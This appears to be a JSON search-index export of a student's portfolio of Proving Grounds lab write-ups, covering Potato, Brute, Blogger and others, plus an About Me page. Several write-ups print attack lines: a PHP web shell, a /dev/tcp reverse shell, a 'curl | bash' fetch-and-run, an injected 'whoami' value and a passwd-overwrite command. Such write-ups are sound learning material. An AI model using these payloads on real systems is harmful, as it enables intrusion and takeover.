[{"content":"Recon :\nrust scan\n5 open ports..\nScan : Nmap scan\nHttp server running on apache, Samba server with V. smbd 4.6.2 and another http server hosted by miniserv on V. 1.981 also with 20000 on 1.830\nOS runs on debian.\nEnumeration :\nWebsite running on port 80 shows default apache page.\nviewing it source code beneath shows a message.\nUsing https:///dcode.fr\nDecrypted it to this string..\nkeep it note, might be useful along the line..\n`.2uqPEfj3D\u0026lt;P\u0026rsquo;a-3\nPort 139\u0026amp;445\nUsing enum4linux, found 2 users, cyber \u0026amp; nobody..\ntried the creds for webmin server on port 10000 but wasnt valid.\nTried on webmin on port 20000 and it was valid..\nNow, get an interactive shell.\nclick on the command shell in the application side bar\nset up a listener.\nsince the application framework language runs on Perl, use a Perl payload to attempt a reverse connection..\ngot a shell and also the local.txt flag text.\nThere is a tar binary in the user\u0026rsquo;s directory.. checking gtfobins..\nability to read files..\nTry to read the passwd file..\nworks well, read root\u0026rsquo;s history file..\nthere is entries to the file .old_pass.bak in the /var/backups directory\nreading the file reveals a potential password for root. attempt to log in as root with that password.\nValid root login also with the last flag..\n","permalink":"http://localhost:1313/portfolio/empire-breakout/","summary":"Recon :\nrust scan\n5 open ports..\nScan : Nmap scan\nHttp server running on apache, Samba server with V. smbd 4.6.2 and another http server hosted by miniserv on V. 1.981 also with 20000 on 1.830\nOS runs on debian.\nEnumeration :\nWebsite running on port 80 shows default apache page.\nviewing it source code beneath shows a message.\nUsing https:///dcode.fr\nDecrypted it to this string..\nkeep it note, might be useful along the line.","title":"Empire-breakout"},{"content":"Recon :\na quick rustscan to find open ports on the target\nScanning :\nthen a nmap scan for banner grabbing for the open ports\nEnumeration :\nFrom the nmap scan, we could deduce that OS runs Linux and specifically.\nNmap scan report for 192.168.170.94 Host is up (0.043s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 6e:ce:aa:cc:02:de:a5:a3:58:5d:da:2b:ef:54:07:f9 (RSA) | 256 9d:3f:df:16:7a:e1:59:58:84:4a:e3:29:8f:44:87:8d (ECDSA) |_ 256 87:b5:6f:f8:21:81:d3:3b:43:d0:40:81:c0:e3:69:89 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Assertion Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Oct 24 18:25:54 2024 -- 1 IP address (1 host up) scanned in 8.80 seconds There is an Apache web server running, would enumerate it.\nThe website is about fitness.\nFuzzing for hidden endpoints\n/pages shows this PHP files.\nFrom the main page, clicked on the about-us\nTest for LFI\nUsing payload of /etc/passwd, there is an error \u0026ldquo;file does not exist\u0026rdquo;\nCould try other payloads or automate it by fuzzing..\nWhile manually trying different payloads and methodologies, the box creator sends us messages..\nWill continue testing..\nTried everything I knew but was futile, reading over StackOverflow, someone talked about this attack,\nSimple detailed explanation on how it works..\nGoing 1 step from the HTML directory, the local.txt file\nNext, to attempt privilege escalation to the user..\nImporting linpeas\nThere is an unknown binary, will enumerate more..\nGreat\nThe /usr/bin/aria2c executable, which is a command line download utility. We can use it to overwrite some important files. For example, we can use it to overwrite the root’s authorized_keys file.\nIt can be used to read files as well or\nRead it normally..\nIn this scenario, will copy the existing passwd file and add a new user with root rights and copy to the target to the /etc directory using the aria2c binary.\n/usr/bin/aria2c -o passwd \u0026quot;http://192.168.45.219:8000/newpass\u0026quot; --allow-overwrite=true Then switch user to Tom and enter the password (Password@973)\nGot the last flag..\nThanks for reading..\n","permalink":"http://localhost:1313/portfolio/assertion101/","summary":"Recon :\na quick rustscan to find open ports on the target\nScanning :\nthen a nmap scan for banner grabbing for the open ports\nEnumeration :\nFrom the nmap scan, we could deduce that OS runs Linux and specifically.\nNmap scan report for 192.168.170.94 Host is up (0.043s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 6e:ce:aa:cc:02:de:a5:a3:58:5d:da:2b:ef:54:07:f9 (RSA) | 256 9d:3f:df:16:7a:e1:59:58:84:4a:e3:29:8f:44:87:8d (ECDSA) |_ 256 87:b5:6f:f8:21:81:d3:3b:43:d0:40:81:c0:e3:69:89 (ED25519) 80/tcp open http Apache httpd 2.","title":"Assertion101"},{"content":"Recon :\na quick rustscan to find open ports on the target\n![Pasted image 20241024182502.png](/images/Pasted image 20241024182502.png)\nScanning : then a nmap scan for banner grabbing for the open ports\n![Pasted image 20241024182934.png](/images/Pasted image 20241024182934.png)\n# Nmap 7.94SVN scan initiated Thu Oct 24 18:25:45 2024 as: /usr/lib/nmap/nmap -p 22,80 -sCV -oN assertion.txt 192.168.170.94 Nmap scan report for 192.168.170.94 Host is up (0.043s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 6e:ce:aa:cc:02:de:a5:a3:58:5d:da:2b:ef:54:07:f9 (RSA) | 256 9d:3f:df:16:7a:e1:59:58:84:4a:e3:29:8f:44:87:8d (ECDSA) |_ 256 87:b5:6f:f8:21:81:d3:3b:43:d0:40:81:c0:e3:69:89 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Assertion Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Oct 24 18:25:54 2024 -- 1 IP address (1 host up) scanned in 8.80 seconds Enumeration :\nFrom the nmap scan, we could deduce that Os runs Linux and specifically.\nThere is a apache web server running, would enumerate it.\nThe website is about fitness.\n![Pasted image 20241024203759.png](/images/Pasted image 20241024203759.png)\nfuzzing for hidden endpoints\n![Pasted image 20241024203907.png](/images/Pasted image 20241024203907.png)\n/pages shows this php files.\n![Pasted image 20241024203723.png](/images/Pasted image 20241024203723.png)\nFrom the main page, clicked on the about-us\n![Pasted image 20241024204155.png](/images/Pasted image 20241024204155.png)\nTest for lfi ![Pasted image 20241024204233.png](/images/Pasted image 20241024204233.png)\nusing payload of /etc/passwd,there is an error \u0026ldquo;file does not exist\u0026rdquo;\ncould try other payloads or automate it by fuzzing..\nWhile manually trying different payloads and methologies, the box creator sends us messages..\nWill continue testing..\nTried everything i knew but was futile, reading over stackoverflow, someone talked about this attack,\nsimple detailed explanation on how it works..\n![Pasted image 20241101164653.png](/images/Pasted image 20241101164653.png)\ngoing 1 step from the html directory, the local.txt file\n![Pasted image 20241101170919.png](/images/Pasted image 20241101170919.png)\nNext, to attempt privilege escalation to the user..\nimporting linpeas\n![Pasted image 20241101173401.png](/images/Pasted image 20241101173401.png)\nThere is unknown binary, will enumerate more..\n![Pasted image 20241101173511.png](/images/Pasted image 20241101173511.png)\ngreat\n![Pasted image 20241103092231.png](/images/Pasted image 20241103092231.png)\nthe /usr/bin/aria2c executable, which is a command line download utility. We can use it to overwrite some important files. For example, we can use it to overwrite the root’s authorized_keys file.\nIt can be used read files as well or\n![Pasted image 20241103090035.png](/images/Pasted image 20241103090035.png)\nread it normally.. ![Pasted image 20241103101114.png](/images/Pasted image 20241103101114.png)\nin this scenario, will copy the existing passwd file and add a new user with root rights and copy to the target to the /etc directory using the aria2c binary.\n![Pasted image 20241103101150.png](/images/Pasted image 20241103101150.png)\n![Pasted image 20241103100413.png](/images/Pasted image 20241103100413.png)\nthen switch user to Tom and enter the password (Password@973)\n![Pasted image 20241103100632.png](/images/Pasted image 20241103100632.png)\ngot the last flag..\nThanks for reading..\n","permalink":"http://localhost:1313/portfolio/backup/","summary":"Recon :\na quick rustscan to find open ports on the target\n![Pasted image 20241024182502.png](/images/Pasted image 20241024182502.png)\nScanning : then a nmap scan for banner grabbing for the open ports\n![Pasted image 20241024182934.png](/images/Pasted image 20241024182934.png)\n# Nmap 7.94SVN scan initiated Thu Oct 24 18:25:45 2024 as: /usr/lib/nmap/nmap -p 22,80 -sCV -oN assertion.txt 192.168.170.94 Nmap scan report for 192.168.170.94 Host is up (0.043s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.","title":"Assertion101"},{"content":"Recon : a quick ping to verify the target is up. the target is up, will run a quick rust scan on the target to find open ports.\n4 open ports, 21,22,80,3306\nwill run nmap scan to identify the services and versions running on those ports. the results shows FTP, SSH AND HTTP and MYSQL and their respective versions.\nEnumeration:\nStarted enumeration with the ftp server, will attempt to login with an anonymous user. Seems like, it does not permit anonymous login, will go back to that, will continue further enumeration with the web server running on port 80. Visiting the site on the web browser shows a simple login portal with username and password field. Viewed the source code, enumerated more and did not get anything. Also attempted couple of some default credentials. Were all futile.\nAlso, i could try to bruteforce different services, but there are no usernames yet. Further enumeration to my mysql server, attempt to bruteforce mysql with hydra was successful atleast for now until credentials confirmed correct.\nNow, will login with the credentials.\nand it was successful.\nFurther enumeration on the mysql server.\nafter enumerating the database, got a username and a password hash,\nwas able to crack the hash with john the ripper. Back to the web portal, will attempt the credentials. and it was successful.\nThere is an option to view log file which contains logs of attempted failed login to the ftp server. That seems like there might be log poisoining, since the site run on php.\none way to find out, try!\nattempt to login to the ftp server again and use this php code that calls system function.\n\u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; and try to view it in the website again.\nNow, there is response back and it seems the www-data is the current user running.\nFurther enumeration to get reverse shell, after confirming there is command execution, next is to get reverse shell with whatever method you prefer but i will create a payload /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/ip/port 0\u0026gt;\u0026amp;1 and save on local machine, create a simple python webserver to host the file, do not forget the netcat listener and run the following command with curl.\ncurl url | bash e.g curl http://ip/exploit | bash\nand there should be a connection back.\nfurther enumeration to escalate privileges to the user adrian.\nPoking in user adrian home directory, there are files, but the user currently running do not have permission to view but can view .reminder which seems to be a type of rule which is best64 that can be used when generating wordlists using hashcat or johntheripper, then in the last part, it shows + exclamation which means for each generated word, there must be an exclamation mark at the end. Perhaps, can be used to bruteforce ssh or any other services.\nTo generate the potential passwords, add the word ettubrute to a file then type this :\njohn -wordlist:adrian.txt -rules:best64 -stdout \u0026gt; potentials\nNow, adding the exclamation marks. To save myself the stress, created a script in python that would do that.\nNow, attempting to bruteforce ssh with the potential passwords available.\nAfter brute-forcing, finally got the password,\nnow can proceed to login.\nSuccessfully logged in, now the user flag can be accessed.\nNow further enumeration to escalate privileges to the root user.\nIn the user adrian home directory, there are 2 files punch_in and punch_in.sh\nLet\u0026rsquo;s do some analysis on it.\nviewing both files, punch_in.sh file runs every minute and updates the punch_in file with current time. We have write permissions on punch_in and read-only permissions on punch_in.sh file.\nUnder FTP directory, there are some more files too.\nit seems like, the script file under /FTP/files takes the last line of the punch_in file and executing it using /bin/sh\nUsing the punch_in file, since the current user has write permissions to it, can modify the permissions on any files\nmodify the punch_in file to have a reverse shell and set up a netcat listener. After that, will play the waiting game.\nand there is the reverse connection back and also the flag!\nEnd.\n","permalink":"http://localhost:1313/portfolio/brute/","summary":"Recon : a quick ping to verify the target is up. the target is up, will run a quick rust scan on the target to find open ports.\n4 open ports, 21,22,80,3306\nwill run nmap scan to identify the services and versions running on those ports. the results shows FTP, SSH AND HTTP and MYSQL and their respective versions.\nEnumeration:\nStarted enumeration with the ftp server, will attempt to login with an anonymous user.","title":"brute"},{"content":"Platform : PG Level : Easy\nReconnaissance :\nA simple rustscan to find open ports on target. Scanning :\nThen proceeds to scan those ports for running services and version identification using nmap. Enumeration :\nVisit the website, it has a functionality to ping ips. i will proceed to ping the localhost what happens is that it tries to make a ping request to the specified ip if correct and the output are the ping responses with 4 counts Foothold :\nNice, we can test for different potentials vulnerability, but it seems it more potentially vulnerable to command injection. let\u0026rsquo;s test. shall we?\nwe will ping the localhost and execute another system command (whoami) alongside the ip. command : 127.0.0.1;whoami\nWith the ping responses was also the output of the whoami command, command injection spotted. we should be able to execute a reverse shell then.\nlet\u0026rsquo;s find one from https://rev.shells.com please note, it seems like there was a firewall on the target that drops all incoming or outgoing connections from any port apart from port 80, so after few trials, i figured it was port 80. Setup your netcat listener on port 80 and execute the command. I got a reverse shell, found the first flag at user dylan home\u0026rsquo;s directory. time to find the other.\nPrivlege escalation :\nAfter few mins of manual enumeration, searched for suid bit set to them with the user root, found quite number of them and one was distinctive. Let\u0026rsquo;s check gtfobins which is a great resource to find how to exploit binaries in certain ways and techniques, our goal is to escalate privilege vertical to root. so let\u0026rsquo;s find what suits us best. Got one but few issues with it. i will advise you follow the following steps as i did so you can get root.\nsteps\nRun /usr/bin/vim.basic run :py3 and the highlighted command above in blue. you might get stucked while the program is running, you have to quit out of vim. worked for me tho ;)\ni got root, navigated to the root\u0026rsquo;s directory, got the last flag!\nAdios hackers. command Injection.\n","permalink":"http://localhost:1313/portfolio/shakabrah/","summary":"Platform : PG Level : Easy\nReconnaissance :\nA simple rustscan to find open ports on target. Scanning :\nThen proceeds to scan those ports for running services and version identification using nmap. Enumeration :\nVisit the website, it has a functionality to ping ips. i will proceed to ping the localhost what happens is that it tries to make a ping request to the specified ip if correct and the output are the ping responses with 4 counts Foothold :","title":"Shakabrah"},{"content":"platform : Proving Grounds level : easy\nRecon : i will perform a quick rust-scan to see the available open ports. There are three (3) open ports in running on the target, let\u0026rsquo;s enumerate further to understand what services are running on the target ports and their and versions\nScanning \u0026amp; Enumeration : i will also run an nmap scan for further enumeration. The scan result came back and we have ssh , http , ftp running on port 2112, and we can see the ftp server contains some files. might help us. let\u0026rsquo;s take a dive, shall we?\nFTP : i will login to the ftp server, since the server allows anonymous login and i will also specify the port number since ftp doesnt run on it default port, the creds are anonymous/anonymous. let\u0026rsquo;s list the contents in the server since we saw there was some files in the server from our nmap scan result. i will download everything in my local machine using the mget * command, then i will view the file content. The welcome.msg file doesn\u0026rsquo;t really gives us any valuable information, let\u0026rsquo;s move on to the next, the index.php.bak file is a html document, concatenating the content shows a php login script that once we enter the correct creds, we login in and it takes us to the dashboard else it prints a error message, looking at the script we see we have a username admin which shows admin is a valid user and we have a password potato which is in the $pass variable, and then the actually login form. let\u0026rsquo;s continue with our enumeration, that information might help us somewhere.\nHTTP: Navigating to the website, we have a static page with the Title Potato Company. i will perform a directory bruteforce incase there are any hidden directories\nooooh, result came back and it looks like we have 1 hidden directory admin Navigating to the directory shows this simple login form.\nlet\u0026rsquo;s try default creds which is admin/admin which gave an error bad user, we see some familiarity with the form action and the index.php.bak we came across earlier. We know that from the code the admin name exists and that the password is changed regularly base on the comment from the php script . Going with this we can try the strcmp bypass on the password value.\nAuthentication bypass i will use burpsuite for this so i can intercept traffic. And then, i will set the password value to []==\u0026quot;\u0026quot;\nNice, we are in, let\u0026rsquo;s go back to enumeration, While checking around, in the logs section, i will test if the server validates user\u0026rsquo;s input, i will try to move out of webroot\u0026rsquo;s directory, i will try to read the passwd file Great, it vulnerable to path transversal, there is a user on the machine, webadmin and we have the user\u0026rsquo;s hash.\nCracking time, let\u0026rsquo;s save in a file, then we will john to crack, i will use the rockyou file as wordlist.\njohn -w=/usr/share/wordlists/rockyou.txt hashfile\nExploitation : booom, we have plaintext creds, let\u0026rsquo;s use this to login to ssh.\nNow in the box, In search of our flags. let\u0026rsquo;s list the content of the user\u0026rsquo;s directory There are few files in the directory, including our flag. On to the last flag.\nPrivilege Escalation :\nsince we have creds for the user, let\u0026rsquo;s see if we have any sort of admin/root privilege to execute any commands with sudo. Cool, i tried the gtfobins exploit but doesn\u0026rsquo;t work. After few searches, i found another and created a file called comrade.sh echo\u0026rsquo;ed /bin/bash to the file and gave full permissions, then executed it. which gave a root bash shell. Navigated to the root directory and get the flag.\nThanks for reading, happy hacking folks, till another time. Adios\nstrump, auth bypass , path traversal.\n","permalink":"http://localhost:1313/portfolio/potato/","summary":"platform : Proving Grounds level : easy\nRecon : i will perform a quick rust-scan to see the available open ports. There are three (3) open ports in running on the target, let\u0026rsquo;s enumerate further to understand what services are running on the target ports and their and versions\nScanning \u0026amp; Enumeration : i will also run an nmap scan for further enumeration. The scan result came back and we have ssh , http , ftp running on port 2112, and we can see the ftp server contains some files.","title":"Potato"},{"content":"Platform : Proving Grounds\nThe target is active and responding to the ICMP ping request.\nRecon A quick rust scan to find the open ports on the targets. There are 2 open ports: 22 (SSH) and 80 (HTTP).\nScanning Run an nmap scan to confirm and identify the versions of those services. Yes, SSH and HTTP. Based on the banners (Debian), this is a Linux server.\nEnumeration Starting with the web server running on port 80.\nVisiting the website: An image of a cartoon/anime character and an email below. The source code didn\u0026rsquo;t reveal anything interesting.\nProceeding to fuzz for hidden endpoints.\nFound nothing, just the image file. Feeling stuck.\nExploitation Since the name \u0026ldquo;Gaara\u0026rdquo; appeared, I tried using it to brute force the SSH server with the rockyou wordlist.\nFortunately, I got a hit.\nLogged in to the server and found the first flag in Gaara\u0026rsquo;s home directory: Privilege Escalation After uploading LinPEAS and executing it, I found a binary, /usr/bin/gdb.\nChecked GTFObins and found a technique to exploit the SUID bit for privilege escalation.\nThe binary\u0026rsquo;s full path needed to be specified.\nGained root privileges! The EUID is set to 0 (root). Retrieved the last flag in the root directory: Last flag captured.\nThis box was quite easy and straightforward.\nEnd!\n","permalink":"http://localhost:1313/portfolio/gaara/","summary":"Platform : Proving Grounds\nThe target is active and responding to the ICMP ping request.\nRecon A quick rust scan to find the open ports on the targets. There are 2 open ports: 22 (SSH) and 80 (HTTP).\nScanning Run an nmap scan to confirm and identify the versions of those services. Yes, SSH and HTTP. Based on the banners (Debian), this is a Linux server.\nEnumeration Starting with the web server running on port 80.","title":"Gaara"},{"content":"Platform: Proving Grounds\nLevel: Easy\nRecon: A rustscan as usual!\nTwo open ports 22 and 80, by default, we know that is SSH and HTTP.\nScanning: Let\u0026rsquo;s go ahead and scan those ports to know which services run on them and their versions.\nSSH and HTTP with their respective versions, and we can deduce the OS is Linux.\nEnumeration: I ran a curl command to the webserver, hoping to get some information from the headers. Visiting the webpage shows a portfolio:\nI fuzzed for hidden directories and found a few: /assets, /images, /css, /js. Visiting /assets, there were more directories. Going to /fonts/blog, there was a strange redirection and a change in the hostname:\nIt looks like a WordPress site, so I added the hostname to my hosts file:\nA quick look at Wappalyzer showed that it\u0026rsquo;s running an old version of WordPress:\nScanning with WPScan: I used WPScan to scan the site. WPScan is a powerful CMS scanner specifically for WordPress, with features like user enumeration, plugin detection, and theme detection.\nRunning an aggressive plugin detection scan revealed a vulnerable plugin:\nGaining Access/Foothold: After a quick Google search, I discovered the plugin is vulnerable to arbitrary file upload. It has a public exploit and a Metasploit module, but the Metasploit exploit didn\u0026rsquo;t work for me:\nI decided to exploit it manually.\nOn a blog post, there\u0026rsquo;s an option to make a comment with an image upload functionality:\nTrying to upload any file other than an image throws an error:\nAfter several attempts, I was able to bypass the filter using file headers. The server checks files via mechanisms like file extensions and MIME types, but I was able to trick it by injecting a GIF file type header into a reverse shell script from PentestMonkey:\nI filled out the other form fields and submitted the comment:\nMeanwhile, I set up a netcat listener, and once the comment was posted, I received a reverse shell:\nWe now have a shell as www-data. Let\u0026rsquo;s find some flags. I navigated to the user james and found the first flag:\nPrivilege Escalation: Attempting to access other users gave a \u0026ldquo;Permission denied\u0026rdquo; error, so it\u0026rsquo;s time for privilege escalation.\nAfter some enumeration, I found that the user vagrant is also present.\nI continued manual enumeration and discovered that I could escalate privileges to vagrant since this user has permissions to run all commands without a password:\nFinally, I gained root access and captured the flag!\nGreat box.\n","permalink":"http://localhost:1313/portfolio/blogger/","summary":"Platform: Proving Grounds\nLevel: Easy\nRecon: A rustscan as usual!\nTwo open ports 22 and 80, by default, we know that is SSH and HTTP.\nScanning: Let\u0026rsquo;s go ahead and scan those ports to know which services run on them and their versions.\nSSH and HTTP with their respective versions, and we can deduce the OS is Linux.\nEnumeration: I ran a curl command to the webserver, hoping to get some information from the headers.","title":"Blogger"},{"content":"Platform : Proving Grounds Level: Easy\nReconnaissance: A rustscan as usual to find open ports, 22 and 80 opened.\nScanning: Performed an nmap scan to find version information on the open ports and operating system identification using the aggressive nmap flag.\nAn Apache webserver is hosted on port 80, and SSH is running on port 22 as usual.\nA quick visit to the website shows a default Apache webserver page.\nI fuzzed for hidden directories and found a secret directory, which contained a file called evil.php.\nVisiting the secret directory had no content, and evil.php was also empty, but it seemed like a good candidate for fuzzing. I initially thought of using wfuzz, but had issues installing it due to time constraints. So I used BurpSuite\u0026rsquo;s intruder tool, which allowed me to fuzz two parameters using the \u0026ldquo;clustering bomb\u0026rdquo; payload.\nAfter starting the attack and analyzing the results, I noticed a difference in response length. It was a hit! The first parameter was vulnerable to Local File Inclusion (LFI).\nI was able to view the /etc/passwd file.\nExploitation: I initially thought of trying SSH log poisoning or brute-forcing SSH, but neither worked. However, I was able to read the id_rsa file of the user mowree and copied it to my attacker machine.\nUnfortunately, the id_rsa file was passphrase-protected. To crack the passphrase, I used ssh2john to convert the RSA file into a hash that John the Ripper could process.\nAfter running John the Ripper, I successfully cracked the passphrase.\nI was then able to connect to the target via SSH.\nOnce inside, I found the first flag in the user\u0026rsquo;s directory.\nPrivilege Escalation: As time was limited, I transferred the linpeas script to the target for automated enumeration. Upon reviewing the results, I noticed that the passwd file was writable—indicating a serious misconfiguration.\nI followed a guide on how to exploit a writable passwd file, generated a new password using openssl, and added it to the file to create a fake root user.\nSwitching to the new root user worked, and I successfully got the root flag.\nConclusion: Got the root flag, and that\u0026rsquo;s it. Thank you, hackers! Until next time, stay burped!\nVulnerabilities used: LFI, writable passwd file.\n","permalink":"http://localhost:1313/portfolio/evil-box/","summary":"Platform : Proving Grounds Level: Easy\nReconnaissance: A rustscan as usual to find open ports, 22 and 80 opened.\nScanning: Performed an nmap scan to find version information on the open ports and operating system identification using the aggressive nmap flag.\nAn Apache webserver is hosted on port 80, and SSH is running on port 22 as usual.\nA quick visit to the website shows a default Apache webserver page.","title":"Evil-box"},{"content":"Platform: Proving Grounds Level: Easy\nName: Onsystemshelldredd\nReconnaissance: A quick rustscan shows 2 open ports, 2 and 61000.\nScanning: I performed an nmap scan on the target to identify the services running, but nmap only identified one port (FTP), and not the other.\nI ran a separate nmap scan against the port, but nmap didn’t identify the service running on port 61000.\nEnumeration: The FTP service on the target had a misconfiguration, allowing anonymous login with a random password.\nAfter logging into the FTP server, I found a directory named .hannah that contained an id_rsa file. I downloaded it to my attacker machine.\nI now had an id_rsa file and a potential user (hannah), but no way to access the target, which led me to further enumerate port 61000.\nUsing telnet for a banner grab on port 61000, I discovered that it was running SSH.\nExploitation: With the SSH key and the user hannah, I was able to log into the target machine.\nI listed the home directory of the user hannah and retrieved the first flag.\nPrivilege Escalation: To escalate privileges, I used the linpeas script to automate the search for potential privilege escalation vectors.\nIn the /usr/bin/ directory, I found two binaries owned by root, but the cpulimit binary caught my attention.\nI inspected the binary, which showed the help usage of how it works.\nI needed to set both the _UID_ and _GID_ bits on the binary using the command chmod +s.\nAfter setting the necessary bits, I ran /bin/bash -p, which gave me a new shell as root.\nI successfully rooted the box.\nThank you, haxors!\n","permalink":"http://localhost:1313/portfolio/onsystemshelldredd/","summary":"Platform: Proving Grounds Level: Easy\nName: Onsystemshelldredd\nReconnaissance: A quick rustscan shows 2 open ports, 2 and 61000.\nScanning: I performed an nmap scan on the target to identify the services running, but nmap only identified one port (FTP), and not the other.\nI ran a separate nmap scan against the port, but nmap didn’t identify the service running on port 61000.\nEnumeration: The FTP service on the target had a misconfiguration, allowing anonymous login with a random password.","title":"Onsystemshelldredd"},{"content":"","permalink":"http://localhost:1313/portfolio/dc--4/","summary":"","title":""},{"content":"About Me\nIntroduction Hello! My name is Olatunbosun Ayodeji Victor. I\u0026rsquo;m a 19-year-old network and web penetration tester with a deep passion for cybersecurity. My journey into this field began four years ago, and it has been an exciting and challenging adventure ever since.\nEducation I started my cybersecurity journey by learning the fundamentals from platforms like TryHackMe, HackTheBox, and YouTube. I owe much of my knowledge to top educators such as IPPSEC, John Hammond, HackerSploit, and Cryptcat. With the support of friends and mentors, I\u0026rsquo;ve gained a wealth of knowledge in cybersecurity.\nCurrently, I’m pursuing a management degree in Poland while also studying in the United States. Alongside my academic pursuits, I’m working on certifications like eCPPT and PNPT to further solidify my skills in penetration testing.\nCourses and Certifications I’ve completed several courses and earned certifications that demonstrate my commitment to the cybersecurity field:\nPractical Ethical Hacking (PEH) eLearnSecurity Junior Penetration Tester (eJPT) Various courses on Udemy related to ethical hacking and penetration testing. Achievements I\u0026rsquo;ve actively participated in Capture The Flag (CTF) challenges and box attacks across different platforms, which have sharpened my skills:\nCyberStarters CTF - Location: Nigeria - Position: 4th NahamCon - Location: Online - Position: 83rd out of 2,518 teams QuestCon - Location: Online - Position: 5th In addition to my competition success, I’ve also secured a voluntary position as an instructor at WTCNSOLUTIONS, where I teach students ethical hacking based on my knowledge and experience.\nPassions \u0026amp; Hobbies Beyond cybersecurity, I have a range of interests that keep me engaged:\nMusic: I enjoy playing the guitar. Gaming: I\u0026rsquo;m an avid streamer, particularly of Oculus games. Customer Service: I love helping people and providing excellent service. Future Plans Looking ahead, my goal is to complete my studies and secure a position in a reputable organization where I can contribute to protecting digital assets. I’m dedicated to continuing my professional growth in cybersecurity and making a meaningful impact in the field.\nThank you for visiting my page! I’m excited to connect with others who share my passions and interests.\n","permalink":"http://localhost:1313/whoami/","summary":"About Me\nIntroduction Hello! My name is Olatunbosun Ayodeji Victor. I\u0026rsquo;m a 19-year-old network and web penetration tester with a deep passion for cybersecurity. My journey into this field began four years ago, and it has been an exciting and challenging adventure ever since.\nEducation I started my cybersecurity journey by learning the fundamentals from platforms like TryHackMe, HackTheBox, and YouTube. I owe much of my knowledge to top educators such as IPPSEC, John Hammond, HackerSploit, and Cryptcat.","title":""}]